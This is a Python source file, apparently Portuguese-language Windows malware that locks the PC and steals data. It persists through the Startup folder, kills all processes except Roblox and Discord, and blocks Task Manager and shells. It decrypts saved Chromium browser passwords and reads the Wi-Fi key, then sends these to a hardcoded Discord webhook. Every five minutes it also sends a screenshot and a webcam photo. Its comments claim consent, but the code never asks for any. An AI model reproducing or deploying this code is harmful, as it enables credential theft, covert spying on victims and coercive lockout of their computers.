import os
import shutil
import socket
import requests
import pyautogui
import cv2
import time
import tempfile
import subprocess
import ctypes
import win32api
import win32con
import win32gui
import win32process
from datetime import datetime
from threading import Thread
import pytz
import tkinter as tk
from tkinter import messagebox
import keyboard
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import glob

# --- CONFIGURA√á√ïES ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1394031732721979422/doqnuLAykcwssJWYCTJ5hdR-zLIiPj716YuOGAwvqQ_XRAYP3dwtg6QsLogDzi5sSL8A"
CODIGO_SECRETO = "jolgue"
INTERVALO_MINUTOS = 5
APPS_PERMITIDOS = ["RobloxPlayerBeta.exe", "Discord.exe"]
TEXTO_AVISO = (
    "‚ö†Ô∏è Est√° tudo bloqueado tirando o Roblox e o Discord.\n"
    "Fala com o ‚Äúgoncal_fruits._69394‚Äù ou com o ‚Äújolgue_011‚Äù no Discord para desbloquear o teu PC."
)
FLAG_DESBLOQUEIO = "C:\\ProgramData\\unlocked.flag"
NOME_EXE = "bloqueio.exe"  # Nome do teu EXE compilado

# Navegadores Chromium-based suportados para extrair senhas (com consentimento)
BROWSERS = {
    "Google Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
    "Microsoft Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
    "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
    "Opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
    "Vivaldi": os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data"),
    "Yandex": os.path.expandvars(r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data"),
    "Cent Browser": os.path.expandvars(r"%LOCALAPPDATA%\CentBrowser\User Data"),
    "Comodo Dragon": os.path.expandvars(r"%LOCALAPPDATA%\Comodo\Dragon\User Data"),
    "Slimjet": os.path.expandvars(r"%LOCALAPPDATA%\Slimjet\User Data"),
}

# --- FUN√á√ïES AUXILIARES ---

def enviar_webhook(mensagem, ficheiro=None):
    data = {"content": mensagem}
    files = {}
    if ficheiro:
        try:
            files["file"] = (os.path.basename(ficheiro), open(ficheiro, 'rb'))
            requests.post(WEBHOOK_URL, data=data, files=files)
        except Exception as e:
            print(f"Erro ao enviar ficheiro: {e}")
    else:
        try:
            requests.post(WEBHOOK_URL, json=data)
        except Exception as e:
            print(f"Erro ao enviar webhook: {e}")

def obter_ip_localizacao():
    try:
        response = requests.get("http://ip-api.com/json/")
        info = response.json()
        return (
            f"IP: {info.get('query')}\n"
            f"Cidade: {info.get('city')}\n"
            f"Regi√£o: {info.get('regionName')}\n"
            f"Pa√≠s: {info.get('country')}\n"
            f"ISP: {info.get('isp')}\n"
        )
    except:
        return "N√£o foi poss√≠vel obter a localiza√ß√£o."

def obter_ssid():
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'SSID' in linha and 'BSSID' not in linha:
                return linha.split(':')[1].strip()
    except:
        return "N√£o foi poss√≠vel obter o SSID"

def obter_senha_wifi(ssid):
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'Key Content' in linha:
                return linha.split(':')[1].strip()
        return "Senha n√£o encontrada"
    except:
        return "N√£o foi poss√≠vel obter a senha"

def tirar_screenshot():
    caminho = os.path.join(tempfile.gettempdir(), "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(caminho)
    return caminho

def tirar_foto_webcam():
    caminho = os.path.join(tempfile.gettempdir(), "webcam.png")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(caminho, frame)
    cam.release()
    return caminho

def listar_processos():
    procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore")
    enviar_webhook(f"üìÉ Processos ativos ({hostname}):\n{procs[:1900]}")

def listar_desktop():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    arquivos = "\n".join(os.listdir(desktop_path))
    enviar_webhook(f"üñ•Ô∏è Ficheiros na √Årea de Trabalho ({hostname}):\n{arquivos[:1900]}")

def obter_dispositivos_rede():
    try:
        output = subprocess.check_output("arp -a", shell=True).decode()
        return output
    except:
        return "N√£o foi poss√≠vel obter dispositivos da rede."

def watchdog():
    esconder_janela()
    while not desbloqueado[0]:
        procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore").lower()
        for bloqueado in ["taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe"]:
            if bloqueado in procs:
                subprocess.call(f"taskkill /f /im {bloqueado}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

def esconder_janela():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

def definir_papel_preto():
    SPI_SETDESKWALLPAPER = 20
    preto_path = os.path.join(tempfile.gettempdir(), "preto.bmp")
    with open(preto_path, 'wb') as f:
        f.write(b'BM6\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00'
                b'\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x0B\x00\x00\x13\x0B\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\x00')
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, preto_path, 3)

def bloquear_apps():
    while True:
        if desbloqueado[0]:
            break
        procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore").lower()
        for linha in procs.split("\n"):
            for proc in linha.split():
                if proc.endswith(".exe") and proc not in [a.lower() for a in APPS_PERMITIDOS] and NOME_EXE.lower() not in proc:
                    subprocess.call(f"taskkill /f /im {proc}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Cancelar tentativas de shutdown/restart
        subprocess.call("shutdown -a", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

def janela_mensagem():
    def continuar():
        root.destroy()
        janela_desbloqueio()

    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("600x300")
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Impede fechar janela
    tk.Label(root, text=TEXTO_AVISO, font=("Arial", 14), justify="center", wraplength=500).pack(pady=40)
    tk.Button(root, text="OK", command=continuar, font=("Arial", 12)).pack(pady=20)
    root.mainloop()

def janela_desbloqueio():
    def tentar_desbloquear():
        if entrada.get() == CODIGO_SECRETO:
            desbloqueado[0] = True
            open(FLAG_DESBLOQUEIO, "w").write("desbloqueado")
            enviar_webhook(f"üîì C√≥digo correto inserido. PC desbloqueado ({hostname})")
            root.destroy()
        else:
            messagebox.showerror("Erro", "C√≥digo incorreto!")

    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("400x200")
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Impede fechar janela
    tk.Label(root, text="Insira o c√≥digo para desbloquear:", font=("Arial", 14)).pack(pady=20)
    entrada = tk.Entry(root, font=("Arial", 14), show="*")
    entrada.pack(pady=10)
    tk.Button(root, text="Desbloquear", command=tentar_desbloquear, font=("Arial", 12)).pack(pady=10)
    root.mainloop()

def atalho_secreto():
    keyboard.add_hotkey('ctrl+shift+g', desbloquear_forcado)

def desbloquear_forcado():
    if not desbloqueado[0]:
        desbloqueado[0] = True
        open(FLAG_DESBLOQUEIO, "w").write("desbloqueado")
        enviar_webhook(f"üö® PC desbloqueado com CTRL+SHIFT+G ({hostname})")

def adicionar_startup():
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = os.path.join(os.getcwd(), NOME_EXE)
    if not os.path.exists(os.path.join(startup, NOME_EXE)):
        shutil.copy2(exe_path, startup)

# -- SENHAS NAVEGADORES (Chromium) --

def get_encryption_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_password(ciphertext, key):
    try:
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt_and_verify(payload, tag)
            return decrypted_pass.decode()
        else:
            decrypted_pass = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
            return decrypted_pass.decode()
    except Exception as e:
        return f"Erro ao descriptografar: {str(e)}"

def extrair_senhas(browser_name, browser_path):
    results = []
    if not os.path.exists(browser_path):
        return results
    perfis = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
    for perfil in perfis:
        login_db = os.path.join(browser_path, perfil, "Login Data")
        local_state = os.path.join(browser_path, "Local State")
        if not os.path.exists(login_db) or not os.path.exists(local_state):
            continue
        try:
            key = get_encryption_key(local_state)
            temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_{perfil}_LoginData.db")
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pwd_encrypted in cursor.fetchall():
                if not user and not pwd_encrypted:
                    continue
                senha = decrypt_password(pwd_encrypted, key)
                results.append({
                    "browser": browser_name,
                    "perfil": perfil,
                    "url": url,
                    "username": user,
                    "password": senha
                })
            cursor.close()
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            results.append({"browser": browser_name, "error": str(e)})
    return results

def enviar_senhas():
    todas_senhas = []
    for navegador, caminho in BROWSERS.items():
        senhas = extrair_senhas(navegador, caminho)
        if senhas:
            todas_senhas.extend(senhas)
    if not todas_senhas:
        enviar_webhook("üõë Nenhuma senha encontrada nos navegadores suportados.")
        return
    mensagem = "üîê **Senhas extra√≠das dos navegadores Chromium-based:**\n"
    for i, entry in enumerate(todas_senhas):
        if "error" in entry:
            mensagem += f"‚ö†Ô∏è {entry['browser']} - Erro: {entry['error']}\n"
            continue
        mensagem += (
            f"\n**Browser:** {entry['browser']} | **Perfil:** {entry['perfil']}\n"
            f"URL: {entry['url']}\nUsu√°rio: {entry['username']}\nSenha: {entry['password']}\n"
        )
        if i >= 20:  # Limitar 20 para evitar flood
            mensagem += "\n...mais senhas n√£o mostradas para evitar spam.\n"
            break
    enviar_webhook(mensagem)

# --- EXECU√á√ÉO INICIAL ---
hostname = socket.gethostname()
desbloqueado = [False]

def rotina_principal():
    if not os.path.exists(FLAG_DESBLOQUEIO):
        adicionar_startup()
        definir_papel_preto()

        info_localizacao = obter_ip_localizacao()
        ssid = obter_ssid()
        senha_wifi = obter_senha_wifi(ssid)

        enviar_webhook(
            f"üì° Monitoriza√ß√£o iniciada no PC: {hostname}\n"
            f"{info_localizacao}"
            f"Wi-Fi: {ssid}\n"
            f"Senha Wi-Fi: {senha_wifi}\n"
        )

        Thread(target=bloquear_apps, daemon=True).start()
        Thread(target=watchdog, daemon=True).start()
        Thread(target=janela_mensagem, daemon=True).start()
        Thread(target=atalho_secreto, daemon=True).start()

        # Enviar senhas uma vez com consentimento
        enviar_senhas()

        ultima_info_12h = 0
        while not desbloqueado[0]:
            try:
                hora_local = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                fuso_pt = pytz.timezone("Europe/Lisbon")
                hora_pt = datetime.now(fuso_pt).strftime("%Y-%m-%d %H:%M:%S")

                # Envio de screenshot e webcam a cada 5 min
                screenshot = tirar_screenshot()
                enviar_webhook(f"üñ•Ô∏è Screenshot ({hostname}) | Hora PC: {hora_local} | Hora PT: {hora_pt}", ficheiro=screenshot)
                os.remove(screenshot)

                webcam = tirar_foto_webcam()
                enviar_webhook(f"üì∑ Webcam ({hostname}) | Hora PC: {hora_local} | Hora PT: {hora_pt}", ficheiro=webcam)
                os.remove(webcam)

                # A cada 12h enviar info extra
                agora = time.time()
                if agora - ultima_info_12h > 12 * 3600:
                    ultima_info_12h = agora
                    listar_processos()
                    listar_desktop()
                    dispositivos = obter_dispositivos_rede()
                    enviar_webhook(f"üåê Dispositivos na rede ({hostname}):\n{dispositivos[:1900]}")

            except Exception as e:
                enviar_webhook(f"‚ö†Ô∏è Erro ({hostname}): {e}")
            time.sleep(INTERVALO_MINUTOS * 60)
    else:
        enviar_webhook(f"‚úÖ PC j√° desbloqueado ({hostname}).")

if __name__ == "__main__":
    rotina_principal()
